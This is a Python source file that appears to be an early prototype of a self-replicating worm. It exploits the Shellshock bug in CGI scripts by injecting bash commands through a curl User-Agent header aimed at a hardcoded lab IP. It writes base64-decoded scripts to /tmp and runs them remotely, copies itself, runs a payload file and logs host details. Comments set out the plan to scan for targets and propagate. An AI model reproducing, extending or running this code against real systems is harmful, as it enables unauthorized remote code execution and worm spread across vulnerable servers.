#!/usr/bin/env python3

import os, sys, subprocess # TODO: use subprocess instead of os (?)
import base64
from datetime import datetime

# Test payload information
payload_name = 'test_payload'
payload_content = "print('Hello World')"

# Worm tracking information
def log():
	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
	hostinfo = os.uname()

	f = open('log','x')
	f.write(f'{timestamp}\n{hostinfo}\n')
	f.close()

# Creates a copy of the payload on host
def copy_payload():
	try:
		f = open(payload_name,'x') # 'x' opens for exclusive creation, failing if the file already exists
		f.write(payload_content)
		f.close()
	except:
		# This can potentially check if a host has been infected, but the method isn't robust
		print(f'{payload_name} already exists!')
		sys.exit(0)

# Executes payload on host
def execute_payload():
	exec(open(payload_name).read())
	#os.chmod(payload_name, 0o744) # Changes permissions to: -rwxr--r--
	log()

# Rudimentary way to make a LOCAL copy of itself when executed
def local_replicate():
	script = sys.argv
	name = script[0]

	os.mkdir('test')
	os.system('cp ' + name + ' test')

# Prototype for shellshock exploit via python
def exploit():
	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now

	# Test if host has already been wormed: if yes, create test_already_wormed folder and exits
	if os.path.exists('/tmp/test.sh'):
		print('Machine has already been wormed!')
		os.mkdir('test_already_wormed')
		sys.exit(0)

	# Base64 encode the worm source code for easy injection
	data = open(sys.argv[0], 'rb').read() # Change sys.argv[0]
	encoded = base64.b64encode(data).decode()

	# Hardcoding this for now, preliminary test for RCE and file creation/execution on vulnerable host
	cmd_list = []
	cmd_list.append('echo ZWNobyAnc3VjY2Vzc2Z1bCcgPiAvdG1wL3Rlc3Rfc3VjY2Vzcy50eHQ= > /tmp/test') # echo 'successful' > /tmp/test_success.txt
	cmd_list.append('base64 -d /tmp/test > /tmp/test.sh')
	cmd_list.append('chmod 777 /tmp/test.sh')
	cmd_list.append('/tmp/test.sh') # Successful when test_success.txt file gets created, proving creation and execution of a file on remote host
	print(cmd_list) # Debug

	for IP in targets:
		vulnerable_path = targets[IP]
		url = f'http://{IP}{vulnerable_path}'
		print(url) # Debug

		for cmd in cmd_list:
			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
			exploit += '\'' + cmd + '\'"'
			exploit += ' ' + url
			subprocess.run(exploit, shell=True)

def main():
	# TODO:
	# - Also implement something so worm doesn't infect the computer that started it
	#
	# checkifrunning() # if worm already exists on host, then exit
	# gettargetIPs() # for now/simplicity/POC, just check if port 80 is open
	# shellshockvulnscan(targetIPs) # check common cgi paths for shellshock vuln
	#	returns target ip with its associated vulnerable path (if none, then exit program)
	# createpayloadarray()
	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself


	exploit()
	copy_payload()
	execute_payload()
	local_replicate() # This will not be necessary


	"""
	Making a copy of itself on vulnerable host:
	1) Identify RCE vulnerability
	2) Bring this script to host using RCE vulnerability (eg. echo [contents] > /tmp/worm)
	3) Execute /tmp/worm on vulnerable host
	4) This will propagage
	"""

main()
